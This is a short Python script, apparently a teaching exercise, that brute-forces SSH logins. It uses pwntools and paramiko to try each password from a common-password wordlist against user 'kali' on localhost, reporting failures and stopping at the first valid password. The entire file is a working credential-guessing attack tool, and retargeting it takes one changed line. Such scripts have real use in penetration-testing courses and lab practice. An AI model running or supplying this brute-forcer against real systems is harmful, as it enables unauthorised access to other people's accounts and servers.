from pwn import *
import paramiko

host = "127.0.0.1"
username = "kali"
attempts = 0 

# In order to perform bruteforcing we need to iterate over passwords in a word file
with open("ssh-common-passwords.txt", "r") as password_list:
    for password in password_list:
        password = password.strip() # Get rid of new lines in password wordlist
        try: # Try statement to handle authentication errors
            print("[{}] Attempting password: '{}'!".format(attempts, password))
            response = ssh(host=host, user=username, password=password, timeout=1) 
# From pwn module with host 127.0.0.1 and timeout to give up after 1 second 
            if response.connected(): # Checks if response is valid
                print("[>] Valid password found: '{}'!".format(password))
                response.close() # Close out after finding a valid password
                break
            response.close() # Close the connection and try all over again in a loop if the  # password fails or until the words from the wordlist have been attempted
        except paramiko.ssh_exception.AuthenticationException: # Use an exception to tell
# the user if the password is not valid
            print("[X] Invalid password!")
        attempts += 1
